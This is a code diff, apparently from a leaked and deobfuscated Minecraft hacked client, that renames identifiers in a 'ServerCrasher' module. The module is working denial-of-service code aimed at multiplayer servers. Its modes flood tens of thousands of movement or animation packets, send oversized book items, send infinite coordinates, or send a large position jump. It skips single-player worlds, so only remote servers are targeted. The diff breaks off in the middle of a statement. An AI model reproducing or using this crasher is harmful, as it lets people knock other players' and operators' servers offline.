@@ -10,7 +10,7 @@ public class Class5266 extends PremiumModule {
 
     public Class5266() {
         super("ServerCrasher", "Crashes a server", ModuleCategory.WORLD);
-        this.method15972(new Class6005("Mode", "Crasher mode", 0, "Flying Enabled", "Vanilla", "Book", "Infinity", "BrainFreeze"));
+        this.registerSetting(new ModeSetting("Mode", "Crasher mode", 0, "Flying Enabled", "Vanilla", "Book", "Infinity", "BrainFreeze"));
     }
 
     @Override
@@ -21,7 +21,7 @@ public class Class5266 extends PremiumModule {
     @EventTarget
     private void method16482(TickEvent var1) {
         if (this.method15996()) {
-            if (mc.method1530()) {
+            if (mc.isSingleplayer()) {
                 this.method16000();
             } else {
                 String var4 = this.getStringSettingValueByName("Mode");
@@ -35,7 +35,7 @@ public class Class5266 extends PremiumModule {
 
                         for (int var26 = 0; var26 < 50000; var26++) {
                             var14 = var26 * 7;
-                            mc.getClientPlayNetHandler().sendPacket(new Class5605(var6 - var14, var8 + var12, var10 + var14, false));
+                            mc.getConnection().sendPacket(new Class5605(var6 - var14, var8 + var12, var10 + var14, false));
                         }
 
                         Class8906.method32487("Trying to crash the server..");
@@ -46,16 +46,16 @@ public class Class5266 extends PremiumModule {
                             this.field23695 = 0;
 
                             for (int var25 = 0; var25 < 100000; var25++) {
-                                mc.getClientPlayNetHandler().sendPacket(new CAnimateHandPacket(Hand.field182));
+                                mc.getConnection().sendPacket(new CAnimateHandPacket(Hand.MAIN_HAND));
                             }
 
                             Class8906.method32487("Trying to crash the server..");
                         }
                         break;
                     case "Book":
-                        ItemStack var16 = new ItemStack(Class8514.field38047);
-                        Class41 var17 = new Class41();
-                        Class39 var18 = new Class39();
+                        ItemStack var16 = new ItemStack(Items.field38047);
+                        ListNBT var17 = new ListNBT();
+                        CompoundNBT var18 = new CompoundNBT();
                         String var19 = "";
 
                         for (int var20 = 0; var20 < 5000; var20++) {
@@ -64,19 +64,19 @@ public class Class5266 extends PremiumModule {
                         }
 
                         for (int var27 = 0; var27 < 50; var27++) {
-                            Class40 var22 = new Class40(var19);
+                            StringNBT var22 = new StringNBT(var19);
                             var17.add(var22);
                         }
 
                         var18.method109("author", "LeakedPvP");
                         var18.method109("title", "Sigma");
-                        var18.method99("pages", var17);
-                        var16.method32164("pages", var17);
+                        var18.put("pages", var17);
+                        var16.setTagInfo("pages", var17);
                         var16.method32148(var18);
 
                         for (int var28 = 0; var28 < 100; var28++) {
                             try {
-                                mc.getClientPlayNetHandler().sendPacket(new Class5514(0, var16));
+                                mc.getConnection().sendPacket(new Class5514(0, var16));
                             } catch (Exception var23) {
                             }
                         }
@@ -84,12 +84,12 @@ public class Class5266 extends PremiumModule {
                         this.method16000();
                         break;
                     case "Infinity":
-                        mc.getClientPlayNetHandler().sendPacket(new Class5605(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, true));
+                        mc.getConnection().sendPacket(new Class5605(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, true));
                         Class8906.method32487("Trying to crash the server..");
                         this.method16000();
                         break;
                     case "BrainFreeze":
-                        mc.getClientPlayNetHandler()
+                        mc.getConnection()
                                 .sendPacket(
                                         new Class5605(
                                                 mc.player.getPosX() + 9999.0,
@@ -98,7 +98,7 @@ public class Class5266 extends PremiumModule {
                                                 false
                                         )
                                 );
-                        mc.getClientPlayNetHandler()
+                        mc.getConnection()
                                 .sendPacket(
                                         new Class5605(
                                                 mc.player.getPosX(),
